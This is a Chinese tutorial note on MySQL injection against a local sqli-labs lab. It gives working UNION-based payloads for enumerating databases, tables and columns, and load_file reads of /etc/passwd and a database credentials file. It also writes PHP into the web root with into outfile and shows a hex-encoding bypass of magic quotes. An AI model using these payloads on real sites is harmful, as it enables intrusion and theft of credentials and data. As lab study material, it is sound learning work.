![mysql注入-小迪.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623828836935-8e18a301-2a6e-4457-97f1-1859cd4ddb00.png#clientId=u27d3ce44-43d0-4&from=paste&height=454&id=uf3f774f0&originHeight=908&originWidth=1632&originalType=binary&ratio=2&rotation=0&showTitle=false&size=188930&status=done&style=none&taskId=u39b40eec-62e3-4733-a20b-a00fa5c791d&title=&width=816)
<a name="tK5Ud"></a>
### 一、information_schema
information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。<br />information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。

- **SCHEMATA****表**

当前 mysql 实例中所有数据库的信息。SHOW DATABASES; 命令从这个表获取数据

获取到数据库名称
```bash
mysql> use information_schema;
mysql> select SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA;
+--------------------+----------------------------+
| SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME |
+--------------------+----------------------------+
| information_schema | utf8                       |
| challenges         | gbk                        |
| mysql              | latin1                     |
| performance_schema | utf8                       |
| security           | gbk                        |
+--------------------+----------------------------+
```

- TABLES 表

存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。SHOW TABLES FROM XX; 命令从这个表获取结果。
```bash
mysql> select TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME from tables limit 0,5;
+---------------+--------------------+---------------------------------------+
| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME                            |
+---------------+--------------------+---------------------------------------+
| def           | information_schema | CHARACTER_SETS                        |
| def           | information_schema | COLLATIONS                            |
| def           | information_schema | COLLATION_CHARACTER_SET_APPLICABILITY |
| def           | information_schema | COLUMNS                               |
| def           | information_schema | COLUMN_PRIVILEGES                     |
+---------------+--------------------+---------------------------------------+
5 rows in set (0.00 sec)
```

- COLUMNS 表

存储表中的列信息，包括表有多少列、每个列的类型等。SHOW COLUMNS FROM schemaname.tablename 命令从这个表获取结果。
```bash
mysql> SELECT TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME FROM COLUMNS LIMIT 2,5;
+---------------+--------------------+----------------+
| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME     |
+---------------+--------------------+----------------+
| def           | information_schema | CHARACTER_SETS |
| def           | information_schema | CHARACTER_SETS |
| def           | information_schema | COLLATIONS     |
| def           | information_schema | COLLATIONS     |
| def           | information_schema | COLLATIONS     |
+---------------+--------------------+----------------+
```

- USER_PRIVILEGES 表

用户权限表。内容源自 mysql.user 授权表。是非标准表。
```bash
mysql> SELECT * FROM USER_PRIVILEGES limit 0,5;
+--------------------+---------------+----------------+--------------+
| GRANTEE            | TABLE_CATALOG | PRIVILEGE_TYPE | IS_GRANTABLE |
+--------------------+---------------+----------------+--------------+
| 'root'@'localhost' | def           | SELECT         | YES          |
| 'root'@'localhost' | def           | INSERT         | YES          |
| 'root'@'localhost' | def           | UPDATE         | YES          |
| 'root'@'localhost' | def           | DELETE         | YES          |
| 'root'@'localhost' | def           | CREATE         | YES          |
+--------------------+---------------+----------------+--------------+
5 rows in set (0.00 sec)

```
<a name="Vv3WH"></a>
### 二、跨库攻击
前提准备
```bash
mysql> create database book;
mysql> use book;
mysql> CREATE TABLE IF NOT EXISTS book(    `book_id` INT UNSIGNED AUTO_INCREMENT,    `book_title` VARCHAR(100) NOT NULL,    `book_author` VARCHAR(40) NOT NULL,    `submission_date` DATE,    PRIMARY KEY ( `book_id` ) )ENGINE=InnoDB DEFAULT CHARSET=utf8;
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| book               |
| mysql              |
| performance_schema |
+--------------------+
mysql> use book;
mysql> show tables;
+----------------+
| Tables_in_book |
+----------------+
| book           |
+----------------+
1 row in set (0.00 sec)

mysql> desc book;
+-----------------+------------------+------+-----+---------+----------------+
| Field           | Type             | Null | Key | Default | Extra          |
+-----------------+------------------+------+-----+---------+----------------+
| book_id         | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
| book_title      | varchar(100)     | NO   |     | NULL    |                |
| book_author     | varchar(40)      | NO   |     | NULL    |                |
| submission_date | date             | YES  |     | NULL    |                |
+-----------------+------------------+------+-----+---------+----------------+
4 rows in set (0.00 sec)
```
打开网页进行查询当前数据库的用户<br />`?id=-1%20union%20select%201,user(),3`<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623899443313-8395a3df-cebc-4ed3-a097-0c1e26fafb3a.png#clientId=u26b2aef3-4887-4&from=paste&height=269&id=u03e03e2f&originHeight=461&originWidth=1281&originalType=binary&ratio=2&rotation=0&showTitle=false&size=341945&status=done&style=none&taskId=u02bd5f13-9a71-4075-8c6d-473e2c146d4&title=&width=746.5)<br /> 			可以看到当前用户为root拥有最高的权限。

获取到当前网页的数据库名`?id=-1%20union%20select%201,database(),3`<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623909977853-9096b7a1-d578-4b2b-bb3c-b08b3c480dfc.png#clientId=u26b2aef3-4887-4&from=paste&height=214&id=u49d0ba9f&originHeight=349&originWidth=1221&originalType=binary&ratio=2&rotation=0&showTitle=false&size=31217&status=done&style=none&taskId=u49d3456e-ad89-4a6f-ab3a-dbcc706db1b&title=&width=749.5)<br />获取到当前网站的数据库是security

- 常见的数据库与用户的对应关系
```bash
数据库A=网站A=数据库用户A	——>表名——>列名——>数据
数据库B=网站B=数据库用户B	——>表名——>列名——>数据
数据库C=网站C=数据库用户C	——>表名——>列名——>数据
```
**备注：**这样的好处一个用户对应一个库、这样网站之间的数据互不干扰，当然这是最基础的数据库模型，现在大网站都是分布式数据库。<br /> 

- 在数据库中查询有哪些用户
```bash
mysql> use mysql;
Database changed
mysql> select host,user,password from user;
+--------------+------+----------+
| host         | user | password |
+--------------+------+----------+
| localhost    | root |          |
| 2c8a2316583a | root |          |
| 127.0.0.1    | root |          |
| ::1          | root |          |
+--------------+------+----------+
4 rows in set (0.00 sec)

mysql>
```
在源码中查看使用的是哪一个用户
```bash
root@2c8a2316583a:/var/www/html# cat sql-connections/db-creds.inc
<?php

//give your mysql connection username n password
$dbuser ='root';
$dbpass ='';
$dbname ="security";
$host = 'localhost';
$dbname1 = "challenges";
?>
```
一般在网站安装的时候会指定数据库的用户名和密码这里指定的是root用户密码为空指定的数据库是security<br /> <br /> 跨库查询的前提条件是必须**高权限**的用户才能执行跨库查询。<br />`?id=-1%20union%20select%201,schema_name,3%20from%20information_schema.schemata`<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623911400556-a2069f1c-3047-4aa7-b65e-6bd5ea995d02.png#clientId=u26b2aef3-4887-4&from=paste&height=267&id=u4a851ee0&originHeight=464&originWidth=1281&originalType=binary&ratio=2&rotation=0&showTitle=false&size=345767&status=done&style=none&taskId=udfba4a2b-b24c-46e3-a8ca-eeafeecda0b&title=&width=737.5)<br />数据库中执行
```bash
mysql> SELECT * FROM users WHERE id=-1 union select 1,schema_name,3 from information_schema.schemata LIMIT 0,1;
+----+--------------------+----------+
| id | username           | password |
+----+--------------------+----------+
|  1 | information_schema | 3        |
+----+--------------------+----------+
1 row in set (0.00 sec)

mysql>

```

- 1、获取到所有的数据库名称

`union select 1,group_concat(schema_name),3 from information_schema.schemata`<br />备注：GROUP_CONCAT函数将分组中的字符串与各种选项进行连接。  <br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623982909593-efe1bb93-78de-4f58-b692-22004535b072.png#clientId=u036edfef-3b9a-4&from=paste&height=256&id=ufaf9bd57&originHeight=460&originWidth=1331&originalType=binary&ratio=2&rotation=0&showTitle=false&size=357006&status=done&style=none&taskId=u244c751b-72a4-429b-8c8e-7403ebbefbc&title=&width=739.5)<br />等同于在数据库中执行以下命令
```bash
mysql> use security;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SELECT * FROM users WHERE id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata  LIMIT 0,1;
+----+----------------------------------------------------------------------+----------+
| id | username                                                             | password |
+----+----------------------------------------------------------------------+----------+
|  1 | information_schema,book,challenges,mysql,performance_schema,security | 3        |
+----+----------------------------------------------------------------------+----------+
1 row in set (0.00 sec)

mysql>

```

- 2、指定获取book库中的表名信息

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623983500040-9ffff73e-3511-4af1-b6c0-9f3296f8c5d6.png#clientId=u036edfef-3b9a-4&from=paste&height=209&id=udc018111&originHeight=356&originWidth=1272&originalType=binary&ratio=2&rotation=0&showTitle=false&size=41749&status=done&style=none&taskId=uafea050b-d1f5-40f0-b00d-5f2e91d8b36&title=&width=746)`union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='book'`

等同于在数据库中执行以下命令
```bash
mysql> SELECT * FROM users WHERE id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='book'  LIMIT 0,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | book     | 3        |
+----+----------+----------+
1 row in set (0.00 sec)

mysql>
```

- 3、获取指定数据库book下的book表的列名信息

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623984150615-9e604864-13fc-4997-97fa-3ca560f892a1.png#clientId=u036edfef-3b9a-4&from=paste&height=269&id=u7c345359&originHeight=462&originWidth=1287&originalType=binary&ratio=2&rotation=0&showTitle=false&size=351146&status=done&style=none&taskId=u839c92e6-099b-48e5-8f1c-45c261b1db5&title=&width=750.5)<br />`union select 1,group_concat(column_name),3 from information_schema.columns where table_name='book' and table_schema='book'`<br />等同于以下的数据库命令
```bash
mysql> use security;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SELECT * FROM users WHERE id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='book' and table_schema='book'  LIMIT 0,1;
+----+------------------------------------------------+----------+
| id | username                                       | password |
+----+------------------------------------------------+----------+
|  1 | book_id,book_title,book_author,submission_date | 3        |
+----+------------------------------------------------+----------+
1 row in set (0.00 sec)

mysql>

```

- 4、查询到指定数据

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623984914818-f84be02b-0941-4a10-8075-a87c6a11872b.png#clientId=u036edfef-3b9a-4&from=paste&height=218&id=u172e67f0&originHeight=349&originWidth=1204&originalType=binary&ratio=2&rotation=0&showTitle=false&size=33180&status=done&style=none&taskId=ub615c0d6-08d5-4529-8fb0-6e449e644ab&title=&width=753)
```bash
mysql> SELECT * FROM users WHERE id=-1 union  select book_id,book_title,book_author from book.book  LIMIT 0,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Linux    | oldjiang |
+----+----------+----------+
1 row in set (0.00 sec)

mysql>

```
**备注：**username和password字段是users表中的字段，又因为查询到的数据为空执行后面的联合字句的时候将内容填充到下面所以获取到的内容并不是十分准确，另外要内容十分准确必须要满足book表和user表的结构完全相同
<a name="skiDi"></a>
### 三、文件读写函数
参考地址：[https://www.sqlsec.com/2020/11/mysql.html](https://www.sqlsec.com/2020/11/mysql.html)<br />load_file						文件读取<br />into outfile 或into dumpfile		文件写入

查询是否有写入的权限
```bash
mysql> show global variables like '%secure_file_priv%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```
| Value | 说明 |
| --- | --- |
| NULL | 不允许导入或导出 |
| /tmp | 只允许在 /tmp 目录导入导出 |
| 空 | 不限制目录 |

> 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件
> 在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件

- 文件读取
```bash
mysql> select load_file('/etc/passwd')\G;
*************************** 1. row ***************************
load_file('/etc/passwd'): root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false

1 row in set (0.00 sec)

ERROR:
No query specified

mysql>

```
读取敏感信息：[https://blog.csdn.net/weixin_30292843/article/details/99381669](https://blog.csdn.net/weixin_30292843/article/details/99381669)<br />在网站上面读取内容:`?id=-2%20union%20select%201,load_file(%27/etc/passwd%27),3`<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623989195103-ebd43100-666d-46c5-b646-3a4adf29b728.png#clientId=u036edfef-3b9a-4&from=paste&height=325&id=uecabb3e9&originHeight=650&originWidth=1723&originalType=binary&ratio=2&rotation=0&showTitle=false&size=202365&status=done&style=none&taskId=uc62e071b-e8f7-4237-9d11-7c69c9da6c5&title=&width=861.5)<br />读取数据库的配置信息<br />`?id=-1%20union%20select%201,load_file(%27/var/www/html/sql-connections/db-creds.inc%27),3`<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623989421828-d1d6b120-334d-44ac-a1a6-c66dc28d9d70.png#clientId=u036edfef-3b9a-4&from=paste&height=232&id=uf55ae938&originHeight=464&originWidth=1431&originalType=binary&ratio=2&rotation=0&showTitle=false&size=351102&status=done&style=none&taskId=ud6547cf0-9b89-4957-bd28-e65338b514e&title=&width=715.5)<br />右击查看源代码<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623989440889-9b489f85-4f0e-482b-9241-c8ad2e5f6395.png#clientId=u036edfef-3b9a-4&from=paste&height=380&id=u48f1bf20&originHeight=782&originWidth=1481&originalType=binary&ratio=2&rotation=0&showTitle=false&size=59685&status=done&style=none&taskId=ud837129a-a6cb-438b-819b-295b2289afd&title=&width=720.5)

- 文件写入
```bash
mysql> select '<?php phpinfo() ?>' into outfile './php';
Query OK, 1 row affected (0.00 sec)

mysql>
root@06026a1599f9:/# cat /var/lib/mysql/php
<?php phpinfo() ?>

mysql> select '<?php phpinfo() ?>' into outfile '/var/www/php';
ERROR 1 (HY000): Can't create/write to file '/var/www/php' (Errcode: 13)
mysql>


```
在linux中默认是对/var/lib/mysql目录下有写入权限对其他目录是没有写入权限。<br />对目录修改权限测试
```bash
mysql> select '<?php phpinfo() ?>' into outfile '/var/www/html/test.php';
ERROR 1 (HY000): Can't create/write to file '/var/www/html/test.php' (Errcode: 13)
mysql> \q
root@06026a1599f9:/# chmod -Rf 777 /var/www/html/
root@06026a1599f9:/# mysql
mysql> select '<?php phpinfo() ?>' into outfile '/var/www/html/test.php';
mysql>
```

在网页上写入<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623990955715-3aebcb0b-72d3-4f99-b80c-8d79361cb073.png#clientId=u036edfef-3b9a-4&from=paste&height=211&id=u179c3302&originHeight=422&originWidth=1407&originalType=binary&ratio=2&rotation=0&showTitle=false&size=344666&status=done&style=none&taskId=ufea85899-d531-48bb-9e49-56fa3f7f6f8&title=&width=703.5)
```bash
root@06026a1599f9:/var/lib/mysql# pwd
/var/lib/mysql
root@06026a1599f9:/var/lib/mysql# ls -l test.php
-rw-rw-rw- 1 mysql mysql 23 Jun 18 12:17 test.php
root@06026a1599f9:/var/lib/mysql# cat test.php
1       <?php phpinfo() ?>      3
root@06026a1599f9:/var/lib/mysql#

```
<a name="g5WM3"></a>
### 四、魔术引号开关
   魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，对单引号、双引号、反斜线、NULL加上一个一个反斜线进行转义，这个的作用跟addslashes()的作用完全相同。

  	正确地接收和读取数据，从而正确地执行SQL语句，防止恶意的SQL注入。<br />        简单的SQL注入示例，假设有一个数据库user，我们要传一个参数查询某个用户的信息，我们会调用某个接口，传一个参数给接口，类似于http://域名/?c=xxx&a=xxx&user=xxx，现在我们想查询一个叫codeman的人的信息，那么user=codeman，后台接收到参数之后，执行类似于下面的SQL语句。
```bash
SELECT * FROM `user` WHERE `user` = 'codeman';
```
        如果在接收数据时后台不进行转义，那么久可能让恶意的SQL注入攻击发生，假设我们现在传递一个user=codeman'or'1'='1，传到后台执行的SQL语句变成：
```bash
SELECT * FROM `user` WHERE `user` = 'codeman' or '1' or '1';
```
 为什么在PHP5.4.0及其之后PHP版本中被取消了呢？  
```bash
PHP 5.5.9-1ubuntu4.13 (cli) (built: Sep 29 2015 15:24:49)
Copyright (c) 1997-2014 The PHP Group
Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies
    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies
root@06026a1599f9:/# grep magic /etc/php5/apache2/php.ini
root@06026a1599f9:/# grep magic /etc/php5/cli/php.ini
```
(1)可移植性:<br />编程时认为其打开或并闭都会影响到移植性。可以用 get_magic_quotes_gpc() 来检查是否打开，并据此编程。 

(2）性能<br />        由于并不是每一段被转义的数据都要插入数据库的，如果所有进入 PHP 的数据都被转义的话，那么会对程序的执行效率产生一定的影响。在运行时调用转义函数（如 addslashes()）更有效率。 尽管 php.ini-dist 默认打开了这个选项，但是 php.ini-recommended 默认却关闭了它，主要是出于性能的考虑。<br /> <br />（3）方便<br />由于不是所有数据都需要转义，在不需要转义的地方看到转义的数据就很烦。比如说通过表单发送邮件，结果看到一大堆的 '。针对这个问题，可以使用 stripslashes() 函数处理。[

](https://blog.csdn.net/hyh1123176978/article/details/53893579)<br />**phpstudy环境中PHP版本选择为5.2.17时在php.ini文件中魔术引号的开关**<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1641874428476-fc34f14e-9349-4c5a-b3f3-e13978cf0d49.png#clientId=u25652b30-e34e-4&from=paste&height=227&id=ufe526d59&originHeight=453&originWidth=851&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28957&status=done&style=none&taskId=u0820964c-afa4-4d78-8cc4-001a17bc4d5&title=&width=425.5)<br />选择SQL注入的关卡1阅读源码`$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`这一句中我们要是想注入的话必须让前面的`’`闭合，但是我们开启了魔术引号开关我发生这样的事情。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1641874736094-2e4d1076-f5a4-4f2d-836a-82257cb2aa1c.png#clientId=u25652b30-e34e-4&from=paste&height=159&id=uce296edf&originHeight=216&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44885&status=done&style=none&taskId=ubc2ab9ed-8190-4c32-bde3-8d028f9b287&title=&width=635.5)<br />就是在我们注入的时候添加的`’`会在之后会自动添加`\'`将我们注入语句给注释掉从而失败。将魔术引号关闭之后然后重启phpstudy就可以正常的注入。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1641874968800-80d63951-af81-4910-9e0c-463f9e8b8cd3.png#clientId=u25652b30-e34e-4&from=paste&height=332&id=u8340d281&originHeight=394&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98518&status=done&style=none&taskId=uddca3189-31b7-4593-b143-5a5f01d75d3&title=&width=728.5)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1641875091502-af2e2077-856b-4a4e-8dc9-c80b2ae13fbf.png#clientId=u25652b30-e34e-4&from=paste&height=170&id=u0c2644b6&originHeight=203&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50471&status=done&style=none&taskId=u17654fe1-0f21-4a58-81be-793d34cbdbc&title=&width=724.5)<br />由于docker搭建的环境是PHP5.5版本的没有魔术引号、故不做演示<br />开启了魔术引号之后<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623992866922-673dde49-b0a9-4466-bd67-63f02428c86d.png#clientId=u036edfef-3b9a-4&from=paste&height=166&id=u4f9c3983&originHeight=331&originWidth=1566&originalType=binary&ratio=2&rotation=0&showTitle=false&size=459818&status=done&style=none&taskId=udf920ac4-198b-43a2-ae67-c0c5974b583&title=&width=783)<br />**绕过方法**<br />采用hex(16进制)编码绕过因为对路径进行编码之后魔术引号不会再对其生效也就是说绕过了魔术引号的作用达到绕过。<br />编码软件:winhex
<a name="BEaeK"></a>
### 五、int函数
对输入的数字进行判断是否
```bash
if(is_int($id)){
	$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
	echo $sql;
	$result=mysql_query($sql);
}else{
	echo 'ni shi ge jj?';
}
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624066898179-c8f4bcd4-db2b-49c1-97df-a00113f25520.png#clientId=ud88e88e1-e59a-4&from=paste&height=216&id=u876216e7&originHeight=431&originWidth=1294&originalType=binary&ratio=2&rotation=0&showTitle=false&size=347513&status=done&style=none&taskId=u5f3634e8-9d0e-450b-9b40-b66f2121c42&title=&width=647)

防护软件一般也是对关键字进行防护、触发了waf等安全软件规则会将数据包丢弃。
